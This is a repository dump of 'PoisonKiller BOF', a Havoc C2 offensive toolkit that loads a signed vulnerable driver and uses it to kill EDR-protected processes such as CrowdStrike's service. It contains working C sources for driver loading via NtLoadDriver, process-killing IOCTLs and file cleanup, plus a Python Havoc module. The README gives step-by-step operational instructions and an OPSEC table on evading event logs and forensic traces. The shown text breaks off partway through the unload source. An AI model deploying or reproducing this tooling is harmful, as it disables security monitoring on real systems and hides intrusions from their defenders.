@@ -1,0 +1,1359 @@
+Project Path: arc_Muz1K1zuM_PoisonKiller_bof_oz70y4ov
+
+Source Tree:
+
+```txt
+arc_Muz1K1zuM_PoisonKiller_bof_oz70y4ov
+├── Makefile
+├── PoisonX.sys
+├── README.md
+├── poisonkiller.py
+└── src
+    ├── bof_delete.c
+    ├── bof_kill_multi.c
+    ├── bof_killprocess.c
+    ├── bof_loaddriver.c
+    ├── bof_unloaddriver.c
+    └── common
+        ├── beacon.h
+        ├── ntdefs.h
+        └── utils.h
+
+```
+
+`Makefile`:
+
+```
+CC      = x86_64-w64-mingw32-gcc
+CFLAGS  = -masm=intel -Wall -Wno-unused-function -I src/common
+OUTDIR  = out
+
+BOFS = bof_loaddriver \
+       bof_killprocess \
+       bof_unloaddriver \
+       bof_delete \
+       bof_kill_multi
+
+all: $(OUTDIR) $(BOFS)
+
+$(OUTDIR):
+	mkdir -p $(OUTDIR)
+
+%: src/%.c
+	$(CC) $(CFLAGS) -c $< -o $(OUTDIR)/$@.x64.o
+	@echo "[+] $@.x64.o built"
+
+clean:
+	rm -rf $(OUTDIR)
+	@echo "[+] Clean"
+
+.PHONY: all clean
+```
+
+`README.md`:
+
+```md
+# PoisonKiller BOF
+
+A Havoc C2 BOF implementation of BYOVD (Bring Your Own Vulnerable Driver) to terminate EDR-protected processes. Based on the research by [@j3h4ck](https://github.com/j3h4ck/PoisonKiller).
+
+---
+
+## Quick Usage
+
+```
+# 1. Upload the driver to the target
+upload /local/path/PoisonX.sys C:\Temp\PoisonX.sys
+
+# 2. Load the driver
+pk-load "C:\Temp\PoisonX.sys"
+
+# 3. Get the PID of the target process
+shell tasklist | findstr /i "CSFalconService"
+
+# 4. Kill the process
+pk-kill <PID>
+
+# 5. Unload the driver
+pk-unload <name>
+
+# 6. Delete the .sys from disk
+pk-delete "C:\Temp\PoisonX.sys"
+
+# 7. Clear state
+pk-clear-state
+```
+<img width="622" height="364" alt="image" src="https://github.com/user-attachments/assets/b407fd5f-deae-4073-b124-fdbd51a6bf1a" />
+<img width="476" height="647" alt="image" src="https://github.com/user-attachments/assets/bc2b6fa6-7b56-453c-be44-3b981c6ac126" />
+
+
+
+> **Important**: Always use a clean, dedicated sacrificial beacon for driver operations. Do not use your main C2 beacon. 
+
+---
+
+## Requirements
+
+- Havoc C2
+- Beacon running with elevated administrator privileges (High Integrity)
+- `SeLoadDriverPrivilege` enabled in the token
+- `PoisonX.sys` available on the target
+
+---
+
+## Installation
+
+### Dependencies
+
+```bash
+sudo apt install mingw-w64
+```
+
+### Build
+
+```bash
+make clean && make
+```
+
+Compiled BOFs are output to `out/`:
+
+```
+out/
+├── bof_loaddriver.x64.o
+├── bof_killprocess.x64.o
+├── bof_unloaddriver.x64.o
+├── bof_delete.x64.o
+└── bof_kill_multi.x64.o
+```
+
+### Configure the Python module
+
+Edit `poisonkiller.py` and set `BASE_DIR` for your environment:
+
+```python
+# Example
+BASE_DIR = "/home/user/tools/PoisonKiller"
+```
+
+### Load in Havoc
+
+```
+Scripts > Load > /path/to/project/poisonkiller.py
+```
+
+---
+
+## Commands
+
+| Command | Arguments | Description |
+|---|---|---|
+| `pk-load` | `"<path_sys>"` | Load driver via NtLoadDriver (no SCM) |
+| `pk-kill` | `<PID>` | Kill a process via driver IOCTL |
+| `pk-kill-multi` | `<PID1> <PID2> ... <PIDN>` | Kill multiple processes in rapid succession |
+| `pk-unload` | `<name> "<path_sys>"` | Unload the driver |
+| `pk-delete` | `"<path_sys>"` | Delete the .sys from disk |
+| `pk-clear-state` | — | Clear module state after successful unload |
+| `pk-status` | — | Show current module state |
+| `pk-debug` | — | API diagnostic test on the target |
+
+---
+
+## Project Structure
+
+```
+PoisonKiller-BOF/
+├── poisonkiller.py
+├── Makefile
+├── out/
+│   ├── bof_loaddriver.x64.o
+│   ├── bof_killprocess.x64.o
+│   ├── bof_unloaddriver.x64.o
+│   ├── bof_delete.x64.o
+│   └── bof_kill_multi.x64.o
+├── src/
+│   ├── common/
+│   │   ├── beacon.h
+│   │   ├── ntdefs.h
+│   │   └── utils.h
+│   ├── bof_loaddriver.c
+│   ├── bof_killprocess.c
+│   ├── bof_unloaddriver.c
+│   ├── bof_delete.c
+│   └── bof_kill_multi.c
+└── Drivers/
+    └── PoisonX.sys
+```
+
+---
+
+## Technical Details
+
+### Driver
+
+- **Signed by**: Microsoft Windows Hardware Compatibility Publisher
+- **Signing date**: 2025-03-25
+- **Device path**: `\\.\{F8284233-48F4-4680-ADDD-F8284233}`
+- **Kill IOCTL**: `0x22E010`
+- **Mechanism**: `ZwOpenProcess` + `ZwTerminateProcess` from kernel — bypasses PPL
+
+> This tool has not been tested against CrowdStrike Falcon in a live environment. However, the kernel-level termination mechanism bypasses PPL regardless of the EDR vendor. Any process protected solely by PPL should be terminable. Always test in a lab before using in an engagement.
+
+### Driver Loading (OPSEC)
+
+- Uses `NtLoadDriver` directly — **bypasses the SCM entirely**
+- Does not generate **event 7045** (New Service Installed) or **4697**
+- Registry key created under `HKLM\SYSTEM\CurrentControlSet\Services\<random_name>`
+- Random 8-character lowercase name generated on each execution
+- Registry key deleted **immediately** after loading
+- `.sys` deleted from disk via `pk-delete` after unload
+
+### Unload Flow
+
+The `.sys` file must be deleted **after** unloading with `pk-delete` — not during. Deleting the file during unload causes beacon crashes in subsequent load/unload cycles.
+
+### State Persistence
+
+If the Havoc session is lost, state is automatically restored from `.pk_state` when the script is reloaded:
+
+```
+[*] State restored: driver='abcdefgh' path='C:\Temp\PoisonX.sys'
+```
+
+If the session is lost without `.pk_state`:
+
+```bash
+
+# Force unload by name
+pk-unload <name>
+```
+
+---
+
+## OPSEC Assessment
+
+| Factor | Status |
+|---|---|
+| Event 7045 (SCM) | ✅ Not generated |
+| Persistent registry key | ✅ Deleted immediately after load |
+| Driver name | ✅ Random per execution |
+| .sys on disk after operation | ✅ Deleted via pk-delete |
+| New process creation | ✅ BOF — no CreateProcess |
+| Event 4688 | ✅ Not generated |
+| Sysmon event 6 (driver load) | ⚠️ Generated — unavoidable with NtLoadDriver |
+| Device path GUID | ⚠️ Known IOC — published on GitHub |
+| PDB path in binary | ⚠️ `Hide.pdb` present in the driver |
+| HKLM write | ⚠️ Required for NtLoadDriver |
+
+---
+
+## Known Issues / Bugs
+
+- **Beacon instability after intensive use** — loading/unloading drivers and killing processes in the same beacon session causes accumulated state corruption. The beacon may crash unexpectedly during subsequent operations. **Always use a fresh, dedicated sacrificial beacon exclusively for PoisonKiller operations.** Never use your main persistence beacon. If the sacrificial beacon dies, spawn a new one and continue. I did not manage to solve this.
+
+---
+
+
+---
+
+## Original Research
+
+- **RE Writeup**: [Reverse Engineering a 0day used Against CrowdStrike EDR](https://medium.com/@jehadbudagga/reverse-engineering-a-0day-used-against-crowdstrike-edr-a5ea1fbe3fd4)
+- **Original Repo**: [j3h4ck/PoisonKiller](https://github.com/j3h4ck/PoisonKiller)
+
+```
+
+`poisonkiller.py`:
+
+```py
+import os
+from havoc import Demon, RegisterCommand, RegisterModule
+from struct import pack, calcsize
+import random
+import string
+
+# ── CONFIGURATION ─────────────────────────────────────────────
+# Set this to the absolute path of the cloned repository
+# Example: BASE_DIR = "/home/user/tools/PoisonKiller"
+BASE_DIR = "/path/to/PoisonKiller"
+
+# ── Packer ───────────────────────────────────────────────────
+
+class Packer:
+    def __init__(self):
+        self.buffer: bytes = b''
+        self.size: int = 0
+
+    def getbuffer(self):
+        return pack("<L", self.size) + self.buffer
+
+    def addStr(self, s):
+        if s is None:
+            s = ''
+        if isinstance(s, str):
+            s = s.encode("utf-8")
+        s += b'\x00'
+        fmt = "<L{}s".format(len(s))
+        self.buffer += pack(fmt, len(s), s)
+        self.size += calcsize(fmt)
+
+    def addWStr(self, s):
+        if s is None:
+            s = ''
+        if isinstance(s, str):
+            s = s.encode("utf-16-le")
+        s += b'\x00\x00'
+        fmt = "<L{}s".format(len(s))
+        self.buffer += pack(fmt, len(s), s)
+        self.size += calcsize(fmt)
+
+    def addInt(self, dint):
+        self.buffer += pack("<i", dint)
+        self.size += 4
+
+# ── Helpers ──────────────────────────────────────────────────
+
+def random_name(length=8):
+    return ''.join(random.choices(string.ascii_lowercase, k=length))
+
+BOF_DIR    = os.path.join(BASE_DIR, "out")
+STATE_FILE = os.path.join(BASE_DIR, ".pk_state")
+
+def load_bof(name):
+    path = os.path.join(BOF_DIR, f"{name}.x64.o")
+    if not os.path.isfile(path):
+        raise FileNotFoundError(f"BOF not found: {path}")
+    return path
+
+def save_state(drv_name, sys_path):
+    try:
+        with open(STATE_FILE, "w") as f:
+            f.write(f"{drv_name}:{sys_path}")
+    except Exception as e:
+        print(f"[!] Failed to save state: {e}")
+
+def load_state():
+    try:
+        if os.path.isfile(STATE_FILE):
+            with open(STATE_FILE) as f:
+                parts = f.read().strip().split(":", 1)
+                if len(parts) == 2:
+                    return parts[0], parts[1]
+    except Exception as e:
+        print(f"[!] Failed to read state: {e}")
+    return None, None
+
+def clear_state():
+    try:
+        if os.path.isfile(STATE_FILE):
+            os.remove(STATE_FILE)
+    except Exception as e:
+        print(f"[!] Failed to clear state: {e}")
+
+# In-memory state — restored from disk on script reload
+state = {"drv_name": None, "sys_path": None}
+
+# Restore state on script load
+_drv, _sys = load_state()
+if _drv:
+    state["drv_name"] = _drv
+    state["sys_path"]  = _sys
+    print(f"[*] State restored: driver='{_drv}' path='{_sys}'")
+
+# ── Commands ─────────────────────────────────────────────────
+
+def cmd_load(demonID, *args):
+    demon = Demon(demonID)
+
+    if len(args) < 1:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR,
+            "[!] Usage: pk-load \"<path_to_sys>\"\n")
+        return None
+
+    sys_path = args[0].strip()
+    drv_name = random_name()
+
+    packer = Packer()
+    packer.addWStr(sys_path)
+    packer.addWStr(drv_name)
+
+    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
+        f"[*] Loading driver '{drv_name}' from {sys_path}")
+
+    demon.InlineExecute(TaskID, "go",
+        load_bof("bof_loaddriver"), packer.getbuffer(), False)
+
+    state["drv_name"] = drv_name
+    state["sys_path"]  = sys_path
+    save_state(drv_name, sys_path)
+
+    return TaskID
+
+def cmd_kill(demonID, *args):
+    demon = Demon(demonID)
+
+    if len(args) < 1:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR,
+            "[!] Usage: pk-kill <PID>\n")
+        return None
+
+    try:
+        pid = int(args[0].strip())
+    except ValueError:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR,
+            "[!] PID must be an integer\n")
+        return None
+
+    packer = Packer()
+    packer.addInt(pid)
+
+    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
+        f"[*] Killing process PID {pid}")
+
+    demon.InlineExecute(TaskID, "go",
+        load_bof("bof_killprocess"), packer.getbuffer(), False)
+
+    return TaskID
+
+def cmd_kill_multi(demonID, *args):
+    demon = Demon(demonID)
+
+    if len(args) < 1:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR,
+            "[!] Usage: pk-kill-multi <PID1> <PID2> ... <PIDN>\n")
+        return None
+
+    pids = []
+    for a in args:
+        try:
+            pid = int(a.strip())
+            if pid > 0:
+                pids.append(pid)
+        except ValueError:
+            demon.ConsoleWrite(demon.CONSOLE_ERROR,
+                f"[!] Invalid PID: {a}\n")
+            return None
+
+    if len(pids) == 0:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR,
+            "[!] No valid PIDs provided\n")
+        return None
+
+    packer = Packer()
+    packer.addInt(len(pids))
+    for pid in pids:
+        packer.addInt(pid)
+
+    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
+        f"[*] pk-kill-multi: {len(pids)} PIDs -> {pids}")
+
+    demon.InlineExecute(TaskID, "go",
+        load_bof("bof_kill_multi"), packer.getbuffer(), False)
+
+    return TaskID
+
+def cmd_unload(demonID, *args):
+    demon = Demon(demonID)
+
+    # If no arguments, try to use stored state
+    if len(args) < 1:
+        drv_name = state.get("drv_name")
+        if not drv_name:
+            drv_name, _ = load_state()
+        if not drv_name:
+            demon.ConsoleWrite(demon.CONSOLE_ERROR,
+                "[!] No driver loaded. Use pk-load first or provide driver name.\n")
+            return None
+    else:
+        drv_name = args[0].strip()
+
+    packer = Packer()
+    packer.addWStr(drv_name)
+    packer.addWStr("")  # sys_path not needed for unload
+
+    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
+        f"[*] Unloading driver '{drv_name}'")
+
+    demon.InlineExecute(TaskID, "go",
+        load_bof("bof_unloaddriver"), packer.getbuffer(), False)
+
+    # State is NOT cleared here — confirm with pk-clear-state
+    return TaskID
+
+def cmd_delete(demonID, *args):
+    demon = Demon(demonID)
+
+    if len(args) < 1:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR,
+            "[!] Usage: pk-delete \"<path>\"\n")
+        return None
+
+    path = args[0].strip()
+
+    packer = Packer()
+    packer.addWStr(path)
+
+    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
+        f"[*] Deleting {path}")
+
+    demon.InlineExecute(TaskID, "go",
+        load_bof("bof_delete"), packer.getbuffer(), False)
+
+    return TaskID
+
+def cmd_clear_state(demonID, *args):
+    demon = Demon(demonID)
+    clear_state()
+    state["drv_name"] = None
+    state["sys_path"]  = None
+    demon.ConsoleWrite(demon.CONSOLE_INFO, "[+] State cleared\n")
+    return None
+
+def cmd_status(demonID, *args):
+    demon = Demon(demonID)
+    drv   = state.get("drv_name") or "none"
+    path  = state.get("sys_path")  or "none"
+    disco = os.path.isfile(STATE_FILE)
+    demon.ConsoleWrite(demon.CONSOLE_INFO,
+        f"[*] Status:\n"
+        f"    Driver name : {drv}\n"
+        f"    Sys path    : {path}\n"
+        f"    Disk state  : {'yes -> ' + STATE_FILE if disco else 'no'}\n")
+    return None
+
+def cmd_debug(demonID, *args):
+    demon  = Demon(demonID)
+    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "[*] Debug BOF")
+    demon.InlineExecute(TaskID, "go",
+        load_bof("bof_debug"), b'\x00\x00\x00\x00', False)
+    return TaskID
+
+# ── Command Registration ──────────────────────────────────────
+
+RegisterCommand(cmd_load,         "", "pk-load",
+    "Load driver via NtLoadDriver (no SCM)",
+    0, "pk-load \"<path_to_sys>\"", "[!] Usage: pk-load \"<path>\"\n")
+
+RegisterCommand(cmd_kill,         "", "pk-kill",
+    "Kill a process via driver IOCTL",
+    0, "pk-kill <PID>", "[!] Usage: pk-kill <PID>\n")
+
+RegisterCommand(cmd_kill_multi,   "", "pk-kill-multi",
+    "Kill multiple processes in rapid succession",
+    0, "pk-kill-multi <PID1> <PID2> ... <PIDN>", "")
+
+RegisterCommand(cmd_unload,       "", "pk-unload",
+    "Unload driver (uses stored state if no args provided)",
+    0, "pk-unload [driver_name] [sys_path]", "")
+
+RegisterCommand(cmd_delete,       "", "pk-delete",
+    "Delete the .sys file from disk",
+    0, "pk-delete \"<path>\"", "")
+
+RegisterCommand(cmd_clear_state,  "", "pk-clear-state",
+    "Clear module state after successful unload",
+    0, "pk-clear-state", "")
+
+RegisterCommand(cmd_status,       "", "pk-status",
+    "Show current module state",
+    0, "pk-status", "")
+
+RegisterCommand(cmd_debug,        "", "pk-debug",
+    "API diagnostic test on the target",
+    0, "pk-debug", "")
+
+```
+
+`src/bof_delete.c`:
+
+```c
+#include "beacon.h"
+#include "ntdefs.h"
+#include "utils.h"
+
+DECLSPEC_IMPORT BOOL WINAPI KERNEL32$DeleteFileW(LPCWSTR);
+
+void go(char* args, int len) {
+    datap parser;
+    BeaconDataParse(&parser, args, len);
+
+    int    pathLen = 0;
+    LPWSTR path    = (LPWSTR)BeaconDataExtract(&parser, &pathLen);
+
+    if (!path) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid arguments\n");
+        return;
+    }
+
+    if (KERNEL32$DeleteFileW(path)) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Deleted: %S\n", path);
+    } else {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] DeleteFileW failed: %lu\n",
+            KERNEL32$GetLastError());
+    }
+}
+```
+
+`src/bof_kill_multi.c`:
+
+```c
+#include "beacon.h"
+#include "ntdefs.h"
+#include "utils.h"
+
+#define DEVICE_PATH L"\\\\.\\{F8284233-48F4-4680-ADDD-F8284233}"
+#define IOCTL_KILL  0x22E010
+#define MAX_PIDS    16
+
+DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(
+    LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
+    DWORD, DWORD, HANDLE);
+DECLSPEC_IMPORT BOOL WINAPI KERNEL32$DeviceIoControl(
+    HANDLE, DWORD, LPVOID, DWORD,
+    LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
+
+// Manual itoa — no CRT in BOF
+static void dword_to_str(DWORD val, char* buf) {
+    char tmp[16] = {0};
+    int  i = 0, j = 0;
+    if (val == 0) { buf[0] = '0'; buf[1] = '\0'; return; }
+    while (val > 0) {
+        tmp[i++] = '0' + (val % 10);
+        val /= 10;
+    }
+    for (j = 0; j < i; j++)
+        buf[j] = tmp[i - j - 1];
+    buf[i] = '\0';
+}
+
+// Manual strlen — no CRT in BOF
+static DWORD slen(const char* s) {
+    DWORD n = 0;
+    while (s[n]) n++;
+    return n;
+}
+
+// Kill a single process via IOCTL
+static BOOL kill_pid(HANDLE hDevice, DWORD pid) {
+    char  pidStr[16] = {0};
+    char  outBuf[16] = {0};
+    DWORD bytesRet   = 0;
+
+    dword_to_str(pid, pidStr);
+
+    return KERNEL32$DeviceIoControl(
+        hDevice,
+        IOCTL_KILL,
+        pidStr,  slen(pidStr) + 1,
+        outBuf,  sizeof(outBuf),
+        &bytesRet,
+        NULL);
+}
+
+void go(char* args, int len) {
+    datap parser;
+    BeaconDataParse(&parser, args, len);
+
+    // First argument: number of PIDs to kill
+    DWORD count = (DWORD)BeaconDataInt(&parser);
+
+    if (count == 0 || count > MAX_PIDS) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] Invalid PID count (max %d)\n", MAX_PIDS);
+        return;
+    }
+
+    // Read all PIDs
+    DWORD pids[MAX_PIDS] = {0};
+    DWORD i;
+    for (i = 0; i < count; i++) {
+        pids[i] = (DWORD)BeaconDataInt(&parser);
+        if (pids[i] == 0) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "[-] Invalid PID at position %lu\n", i);
+            return;
+        }
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT,
+        "[*] Killing %lu processes in rapid succession\n", count);
+
+    // ── Open device handle once for all kills ─────────────────
+    HANDLE hDevice = KERNEL32$CreateFileW(
+        DEVICE_PATH,
+        GENERIC_READ | GENERIC_WRITE,
+        0, NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL);
+
+    if (hDevice == INVALID_HANDLE_VALUE) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] CreateFileW failed: %lu (driver loaded?)\n",
+            KERNEL32$GetLastError());
+        return;
+    }
+
+    // ── Kill all PIDs in sequence ─────────────────────────────
+    DWORD killed = 0;
+    for (i = 0; i < count; i++) {
+        if (kill_pid(hDevice, pids[i])) {
+            BeaconPrintf(CALLBACK_OUTPUT,
+                "[+] PID %lu terminated\n", pids[i]);
+            killed++;
+        } else {
+            BeaconPrintf(CALLBACK_ERROR,
+                "[-] PID %lu failed: %lu\n", pids[i],
+                KERNEL32$GetLastError());
+        }
+    }
+
+    KERNEL32$CloseHandle(hDevice);
+    BeaconPrintf(CALLBACK_OUTPUT,
+        "[+] Done: %lu/%lu processes terminated\n", killed, count);
+}
+```
+
+`src/bof_killprocess.c`:
+
+```c
+#include "beacon.h"
+#include "ntdefs.h"
+#include "utils.h"
+
+#define DEVICE_PATH L"\\\\.\\{F8284233-48F4-4680-ADDD-F8284233}"
+#define IOCTL_KILL  0x22E010
+
+DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(
+    LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
+    DWORD, DWORD, HANDLE);
+DECLSPEC_IMPORT BOOL WINAPI KERNEL32$DeviceIoControl(
+    HANDLE, DWORD, LPVOID, DWORD,
+    LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
+
+// Manual itoa — no CRT in BOF
+static void dword_to_str(DWORD val, char* buf) {
+    char tmp[16] = {0};
+    int  i = 0, j = 0;
+    if (val == 0) { buf[0] = '0'; buf[1] = '\0'; return; }
+    while (val > 0) {
+        tmp[i++] = '0' + (val % 10);
+        val /= 10;
+    }
+    for (j = 0; j < i; j++)
+        buf[j] = tmp[i - j - 1];
+    buf[i] = '\0';
+}
+
+// Manual strlen — no CRT in BOF
+static DWORD slen(const char* s) {
+    DWORD n = 0;
+    while (s[n]) n++;
+    return n;
+}
+
+void go(char* args, int len) {
+    datap parser;
+    BeaconDataParse(&parser, args, len);
+
+    DWORD pid = (DWORD)BeaconDataInt(&parser);
+    if (pid == 0) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid PID\n");
+        return;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target PID: %lu\n", pid);
+
+    // ── 1. Open handle to driver device ──────────────────────
+    HANDLE hDevice = KERNEL32$CreateFileW(
+        DEVICE_PATH,
+        GENERIC_READ | GENERIC_WRITE,
+        0, NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL);
+
+    if (hDevice == INVALID_HANDLE_VALUE) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] CreateFileW failed: %lu (driver loaded?)\n",
+            KERNEL32$GetLastError());
+        return;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Device opened\n");
+
+    // ── 2. Convert PID to ASCII string ───────────────────────
+    // Driver expects PID as decimal ASCII string in the input buffer
+    char pidStr[16] = {0};
+    dword_to_str(pid, pidStr);
+
+    // ── 3. Send IOCTL ─────────────────────────────────────────
+    char  outBuf[16] = {0};
+    DWORD bytesRet   = 0;
+
+    BOOL ok = KERNEL32$DeviceIoControl(
+        hDevice,
+        IOCTL_KILL,
+        pidStr,  slen(pidStr) + 1,
+        outBuf,  sizeof(outBuf),
+        &bytesRet,
+        NULL);
+
+    if (ok) {
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "[+] Driver response: %s\n[+] Process %lu terminated\n",
+            outBuf, pid);
+    } else {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] DeviceIoControl failed: %lu\n",
+            KERNEL32$GetLastError());
+    }
+
+    // ── 4. Close handle ───────────────────────────────────────
+    KERNEL32$CloseHandle(hDevice);
+}
+```
+
+`src/bof_loaddriver.c`:
+
+```c
+#include "beacon.h"
+#include "ntdefs.h"
+#include "utils.h"
+
+static DWORD wlen_bytes(LPCWSTR s) {
+    DWORD n = 0;
+    while (s[n]) n++;
+    return (n + 1) * sizeof(WCHAR);
+}
+
+void go(char* args, int len) {
+    datap parser;
+    BeaconDataParse(&parser, args, len);
+
+    // Arguments from Havoc:
+    // arg1 (wchar): full path to .sys  e.g. C:\Temp\PoisonX.sys
+    // arg2 (wchar): random driver name e.g. abcdefgh
+    int    sysPathLen = 0;
+    int    drvNameLen = 0;
+    LPWSTR sysPath    = (LPWSTR)BeaconDataExtract(&parser, &sysPathLen);
+    LPWSTR driverName = (LPWSTR)BeaconDataExtract(&parser, &drvNameLen);
+
+    if (!sysPath || !driverName) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid arguments\n");
+        return;
+    }
+
+    // ── 1. Enable SeLoadDriverPrivilege ──────────────────────
+    if (!EnablePrivilege(L"SeLoadDriverPrivilege")) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] Failed to enable SeLoadDriverPrivilege\n");
+        return;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "[1] SeLoadDriverPrivilege OK\n");
+
+    // ── 2. Build registry paths under HKLM ───────────────────
+    WCHAR fullRegPath[512]     = {0};
+    WCHAR relativeRegPath[512] = {0};
+
+    LPCWSTR svcPrefix    = L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\";
+    LPCWSTR svcPrefixRel = L"SYSTEM\\CurrentControlSet\\Services\\";
+
+    LPWSTR fp = fullRegPath;
+    LPCWSTR t = svcPrefix;
+    while (*t)  *fp++ = *t++;
+    LPCWSTR dn = driverName;
+    while (*dn) *fp++ = *dn++;
+    *fp = L'\0';
+
+    LPWSTR rp = relativeRegPath;
+    t = svcPrefixRel;
+    while (*t)  *rp++ = *t++;
+    dn = driverName;
+    while (*dn) *rp++ = *dn++;
+    *rp = L'\0';
+
+    // ── 3. Create registry key ────────────────────────────────
+    HKEY  hKey   = NULL;
+    DWORD dwDisp = 0;
+    LONG  ret    = ADVAPI32$RegCreateKeyExW(
+                       HKEY_LOCAL_MACHINE,
+                       relativeRegPath,
+                       0, NULL,
+                       REG_OPTION_NON_VOLATILE,
+                       KEY_WRITE,
+                       NULL,
+                       &hKey,
+                       &dwDisp);
+
+    if (ret != ERROR_SUCCESS) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] RegCreateKeyEx failed: %ld\n", ret);
+        return;
+    }
+
+    // Build ImagePath: \??\C:\path\to\driver.sys
+    WCHAR   imagePath[512] = {0};
+    LPCWSTR kPrefix        = L"\\??\\";
+    LPWSTR  p              = imagePath;
+    while (*kPrefix) *p++ = *kPrefix++;
+    LPCWSTR sp             = sysPath;
+    while (*sp)      *p++ = *sp++;
+    *p = L'\0';
+
+    DWORD dwType  = 1; // SERVICE_KERNEL_DRIVER
+    DWORD dwStart = 3; // SERVICE_DEMAND_START
+    DWORD dwError = 1; // SERVICE_ERROR_NORMAL
+
+    ADVAPI32$RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ,
+        (BYTE*)imagePath, wlen_bytes(imagePath));
+    ADVAPI32$RegSetValueExW(hKey, L"Type", 0, REG_DWORD,
+        (BYTE*)&dwType, sizeof(DWORD));
+    ADVAPI32$RegSetValueExW(hKey, L"Start", 0, REG_DWORD,
+        (BYTE*)&dwStart, sizeof(DWORD));
+    ADVAPI32$RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD,
+        (BYTE*)&dwError, sizeof(DWORD));
+    ADVAPI32$RegCloseKey(hKey);
+    BeaconPrintf(CALLBACK_OUTPUT, "[2] Registry key created\n");
+
+    // ── 4. NtLoadDriver ──────────────────────────────────────
+    _NtLoadDriver pNtLoadDriver = NTDLL$NtLoadDriver;
+
+    if (!pNtLoadDriver) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] NtLoadDriver not resolvable\n");
+        ADVAPI32$RegDeleteKeyW(HKEY_LOCAL_MACHINE, relativeRegPath);
+        return;
+    }
+
+    UNICODE_STRING uRegPath;
+    USHORT pathLen = 0;
+    while (fullRegPath[pathLen]) pathLen++;
+    uRegPath.Length        = pathLen * sizeof(WCHAR);
+    uRegPath.MaximumLength = uRegPath.Length + sizeof(WCHAR);
+    uRegPath.Buffer        = fullRegPath;
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[3] Calling NtLoadDriver...\n");
+    NTSTATUS status = pNtLoadDriver(&uRegPath);
+
+    // ── 5. Immediate registry cleanup ────────────────────────
+    // Driver is already in kernel memory — key no longer needed
+    ADVAPI32$RegDeleteKeyW(HKEY_LOCAL_MACHINE, relativeRegPath);
+    BeaconPrintf(CALLBACK_OUTPUT, "[4] Registry key deleted\n");
+
+    // ── 6. Result ─────────────────────────────────────────────
+    if (status == STATUS_SUCCESS) {
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "[+] Driver loaded. NTSTATUS: 0x%08X\n", status);
+    } else if (status == STATUS_OBJECT_NAME_COLLISION) {
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "[!] Driver already loaded -- continuing\n");
+    } else {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] NtLoadDriver failed. NTSTATUS: 0x%08X\n", status);
+    }
+}
+```
+
+`src/bof_unloaddriver.c`:
+
+```c
+#include "beacon.h"
+#include "ntdefs.h"
+#include "utils.h"
+
+DECLSPEC_IMPORT BOOL WINAPI KERNEL32$DeleteFileW(LPCWSTR);
+
+static DWORD wlen_bytes(LPCWSTR s) {
+    DWORD n = 0;
+    while (s[n]) n++;
+    return (n + 1) * sizeof(WCHAR);
+}
+
+void go(char* args, int len) {
+    datap parser;
+    BeaconDataParse(&parser, args, len);
+
+    // Arguments from Havoc:
+    // arg1 (wchar): driver name used during load (e.g. abcdefgh)
+    // arg2 (wchar): path to .sys file (optional, for deletion)
+    int    drvNameLen = 0;
+    int    sysPathLen = 0;
+    LPWSTR driverName = (LPWSTR)BeaconDataExtract(&parser, &drvNameLen);
+    LPWSTR sysPath    = (LPWSTR)BeaconDataExtract(&parser, &sysPathLen);
+
+    if (!driverName) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid arguments\n");
+        return;
+    }
+
+    // ── 0. Enable SeLoadDriverPrivilege ──────────────────────
+    if (!EnablePrivilege(L"SeLoadDriverPrivilege")) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] Failed to enable SeLoadDriverPrivilege\n");
+        return;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "[1] SeLoadDriverPrivilege OK\n");
+
+    // ── 1. Build registry paths ───────────────────────────────
+    WCHAR fullRegPath[512]     = {0};
+    WCHAR relativeRegPath[512] = {0};
+
+    LPCWSTR svcPrefix    = L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\";
